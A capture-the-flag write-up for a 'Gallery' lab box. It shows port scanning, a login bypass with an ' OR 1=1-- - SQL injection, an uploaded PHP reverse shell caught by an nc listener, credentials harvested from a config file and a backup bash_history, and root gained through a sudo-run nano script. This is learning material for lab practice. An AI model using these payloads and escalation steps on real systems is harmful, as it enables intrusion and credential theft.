<h1 align="center">Challenge 029 - Gallery </h1>
<p align="center">
  <img width="90" height="90" alt="Bildschirmfoto vom 2025-09-30 13-04-52" src="https://github.com/user-attachments/assets/74dbadcf-5b0e-4997-943d-59e8d4a1033d" />
</p>
<p align="center"> <b>Difficulty</b>: 3/10 (Fairly Easy) <b>Completed</b>: ✔️ 30.09.2025 </p>

This task will cover web vulnerabilties and boot to root once again. To start we check out the open ports that are available once again

```
root@ip-10-10-146-53:~# nmap -p- -sV 10.10.53.43
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-30 12:19 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.53.43
Host is up (0.00013s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:5F:F0:54:F4:5B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.05 seconds
```

Seems like 3 ports are open.

Visiting the classic http site makes a default Apache2 Ubuntu website visible. If we use gobuster we make one hidden directory visible to us

```
root@ip-10-10-146-53:~# gobuster dir -u http://10.10.53.43 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.53.43
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/gallery              (Status: 301) [Size: 312] [--> http://10.10.53.43/gallery/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Now funnily enough, if we specify port 8080 in http we also manage to visit that same directory, which makes the following site visible

<img width="462" height="379" alt="image" src="https://github.com/user-attachments/assets/54d3d7d6-273e-4ae5-9c3c-fa929d5deef9" />

This answers our second question, which asked what's the name of the CMS (Content-Management-System). Apparently it's a Simple Image Gallery. In here we have the possibility to insert our username and password. But we also get a big clue with the URL that notifies that php is being used: *http://10.10.53.43/gallery/login.php*

Maybe this could be a clue for trying to use a Reverse Shell. Just for fun I tried to login with SQL injection and was a little shocked by how fast that worked, but that instance of my AttackBox was immediately shut down after that as well. I used the basic *' OR 1=1-- -* command, which I probably should not use. I will try to avoid that next time, but it worked out this time around.

We are greeted with the following page now

<img width="1168" height="318" alt="image" src="https://github.com/user-attachments/assets/213c682a-157e-4d8e-9062-fc43fe1333ac" />

Well, well. My next goal is to figure out the password of the admin user to get access to the shell, but when checking *My Account* the password field is left blank

<img width="910" height="847" alt="image" src="https://github.com/user-attachments/assets/0b4579be-50c6-475f-b03a-5c8b4e8729b6" />

Smart, but bad for me. Further checking out the pages reveals a page, which lets us check out albums and even upload our own. Hmmmm... that looks like something we could exploit with a reverse shell.

<img width="936" height="766" alt="image" src="https://github.com/user-attachments/assets/c744d7c7-01ff-40dc-a1b3-fc996fedde1b" />

Let's download the php reverse shell from pentestmonkey, change ports and IP address and set up the listener. Hopefully this works out. We create an album called pwned hehe. Now we upload the php file.

<img width="936" height="766" alt="image" src="https://github.com/user-attachments/assets/94505b8e-62b5-4bd3-ac66-da045607536c" />

That... worked. We didn't even have to change the php version... That's a bit concerning.

```
root@ip-10-10-157-105:~# nc -lvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.134.233 36180
Linux ip-10-10-134-233 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 12:37:28 up 52 min,  0 users,  load average: 0.03, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ whoami
www-data
```

Now after having access we could try to get a hold of the database tables. When checking */var/www/html/gallery* I was able to check the config.php, which made clear that it would require the initialize.php. When cat'ing that php we see:

```
$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```
In here we get insight on some interesting credentials, which we can use to login to the server. We use 

```
$ mysql -u gallery_user -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 304
Server version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

and are in. Now we check for the existing databases

```
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)
```

Very good. Let's check out the gallery_db.

```
MariaDB [information_schema]> USE gallery_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> SHOW TABLES;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.000 sec)
```

Now we move on to the users table.

<img width="858" height="233" alt="Bildschirmfoto vom 2025-09-30 18-07-40" src="https://github.com/user-attachments/assets/b63254c1-c535-42db-87f4-3e5cd6444103" />

We got the hash password. That takes care of that.

After some enumeration I was also able to find one interesting directory, which we could make use of. It's located in the */var/backups/mike_home_backup/documents* directory. There is an accounts.txt file, with which we are able to cat.

```
$ cat accounts.txt
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```

I tried using ssh to get access as mike, but none of these passwords worked out unfortunately.
Maybe I was overlooking something.

And indeed I was. I was able to check the bash_history of the backup file, which contained the password.

```
$ pwd     
/var/backups/mike_home_backup
$ ls -la
total 36
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Jul 10 17:51 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
$ cat .bash_history
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
$ 
```

Using that we were able to get into the ssh machine with mikes user account and finally cat the user.txt

<img width="508" height="295" alt="Bildschirmfoto vom 2025-09-30 15-18-29" src="https://github.com/user-attachments/assets/674e65c5-f884-4a1e-ad4f-25434cafd2db" />

Now for the privilege escalation.

I did the usual and checked for SUID binaries that we could use to our advantage, none of them would help us though. 

I also tried to see what kind of sudo commands mike could run

```
mike@ip-10-10-134-233:~$ sudo -l
Matching Defaults entries for mike on ip-10-10-134-233:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-10-134-233:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

Oh my... a shell 😆. Yeah sure. Love that.

```
mike@ip-10-10-134-233:/opt$ cat rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

Based on the user input four different actions can take place. Either there will be a version check, update, list or read. The last action is especially interesting as it runs nano as sudo, which we can absolutely abuse. So let's run the following command

```
mike@ip-10-10-134-233:/opt$ sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read
```

After pressing enter, we can read the report, but we are not really interested in that. 

<img width="836" height="197" alt="Bildschirmfoto vom 2025-09-30 17-27-11" src="https://github.com/user-attachments/assets/49f08b91-35d1-47da-bac5-22b0ea1e401e" />

According to GTFOBins we try to run the mentioned commands.

<img width="744" height="406" alt="Bildschirmfoto vom 2025-09-30 17-32-24" src="https://github.com/user-attachments/assets/6a209b2a-0471-49d5-9c73-790e21a90c00" />

That seemed to have worked out.

This CTF was a bit more challenging for me then the others. Especially as I forgot a lot of SQL commands. Working with reverse shells and SQL injection on the other hand, was pretty straight to the point. I can only hope that my enumeration skills will only improve from here.
